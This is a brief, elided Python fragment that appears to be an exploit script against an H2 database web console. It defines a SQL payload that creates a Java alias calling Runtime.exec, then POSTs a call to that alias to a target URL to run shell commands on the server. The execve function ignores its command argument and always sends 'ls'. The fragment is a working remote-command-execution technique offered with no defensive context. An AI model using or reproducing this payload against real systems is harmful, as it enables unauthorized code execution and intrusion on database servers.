...
def prepare(url):
	cmd = '''CREATE ALIAS EXECVE AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A"); return s.hasNext() ? s.next() : "";  }$$;'''
...
def execve(url, cmd):
	r = requests.post(url, data={'sql':"CALL EXECVE('ls')"})
